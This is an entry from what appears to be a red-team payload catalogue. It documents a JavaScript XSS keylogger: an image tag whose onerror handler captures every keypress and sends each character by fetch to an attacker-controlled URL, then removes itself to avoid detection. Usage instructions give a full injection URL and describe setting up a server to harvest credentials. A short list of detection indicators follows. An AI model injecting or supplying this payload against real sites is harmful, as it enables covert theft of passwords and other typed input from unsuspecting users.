---
id: 5199542c-d681-461e-8bb7-f30eaadf0000
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:41.727746+00:00'
updated_at: '2023-04-10T20:21:46.424104+00:00'
platforms:
  - Web
tags:
  - xss
  - keylogger
  - payload
  - javascript
validated: true
---

# JavaScript-Image-OnError-Keylogger

## Code

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

## Description

This JavaScript code implements a stealthy keylogger for XSS exploitation. It uses a broken image tag (`<img src=x>`) to trigger the `onerror` event, which then attaches a global keypress event listener to the document. Each keystroke is captured, converted from key code to character using `String.fromCharCode`, and exfiltrated via a GET request to an attacker-specified URL. The element is removed after activation to avoid detection. This payload is ideal for reflected or stored XSS in web applications, enabling the collection of sensitive inputs like passwords without additional dependencies.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `http://domain.com` | Attacker-controlled URL endpoint for receiving keystroke data | `http://attacker.com/log?k=` |

## Usage

Inject this payload into a vulnerable XSS input point, such as a URL parameter, form field, or HTML context that allows script execution (e.g., `https://target.com/search?q=<img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com/log?k="+String.fromCharCode(e.which))},this.remove();'>`). Set up an HTTP server on the attacker side to log incoming requests. The keylogger activates immediately upon page load if the onerror fires, capturing all subsequent keystrokes in the browser session. Used in red team engagements for credential harvesting during phishing or application testing.

## Detection

- Browser developer tools or network tabs showing unexpected fetch requests to external domains with query parameters containing single characters.
- Web application logs indicating injection of `<img src=x onerror=...>` patterns.
- Client-side monitoring for dynamic attachment of `onkeypress` event listeners via JavaScript.
- Anomaly detection in server access logs for high-frequency GET requests from the same user agent with sequential character parameters.
- Content Security Policy violations if CSP is enforced, blocking the inline onerror script.

## Related

- [[procedures/Cross-Site-Scripting-JavaScript-Keylogger]]
